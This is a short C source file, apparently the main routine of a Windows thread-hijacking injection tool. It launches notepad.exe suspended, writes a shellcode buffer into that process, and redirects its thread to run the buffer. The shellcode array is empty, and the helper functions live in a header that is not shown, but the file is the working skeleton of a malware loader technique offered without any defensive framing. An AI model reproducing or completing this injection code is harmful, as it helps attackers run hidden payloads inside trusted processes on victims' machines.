#include "ThreadHijacking.h"

#define TARGET_PROCESS L"C:\\Windows\\System32\\notepad.exe"

int main()
{

		UCHAR Shellcode[] = {
		
		};

	SIZE_T PayloadSize = sizeof(Shellcode);
	HANDLE ProcessHandle = NULL;
	HANDLE ThreadHandle = NULL;
	DWORD ProcessId = 0;
	PVOID TargetPayloadBuffer = NULL;

	if (!CreateSuspendedProcess(TARGET_PROCESS, &ProcessHandle, &ThreadHandle, &ProcessId))
	{
		WARN("Failed To Create a Suspended Process of %ls", TARGET_PROCESS);
		PRINT_ERROR("CreateSuspendedProcess");
		return 1;
	}

	if (!WritePayload(ProcessHandle, Shellcode, PayloadSize, &TargetPayloadBuffer))
	{
		WARN("Failed To Write Payload!");
		PRINT_ERROR("WritePayload");
		return 1;
	}

	if (!HijackRemoteThread(ThreadHandle, TargetPayloadBuffer))
	{
		WARN("Failed To Start Thread Execution!");
		PRINT_ERROR("HijackRemoteThread");
		return 1;
	}

	CHAR("Quit...");
	getchar();

	return 0;

}